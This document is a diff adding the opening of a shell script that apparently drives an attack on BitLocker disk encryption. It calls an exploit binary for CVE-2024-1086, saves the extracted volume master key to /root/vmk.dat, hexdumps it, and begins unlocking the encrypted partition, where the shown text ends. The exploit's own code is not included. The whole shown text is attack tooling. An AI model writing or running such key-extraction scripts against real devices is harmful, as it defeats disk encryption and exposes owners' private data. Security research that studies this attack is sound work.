@@ -1,0 +1,16 @@
+#!/bin/ash
+
+echoInfo () {
+    echo -e "\e[34;1m[+]\e[0m \e[34mInfo: $1\e[0m" >&2
+}
+
+
+# run CVE-2024-1086 exploit
+echoInfo "Exploiting CVE-2024-1086 and obtaining VMK..."
+exploit
+echoInfo "VMK saved in /root/vmk.dat!"
+
+hexdump /root/vmk.dat
+
+# decrypt and mount the file system
+echoInfo "Unlocking Bitlocker partition..."
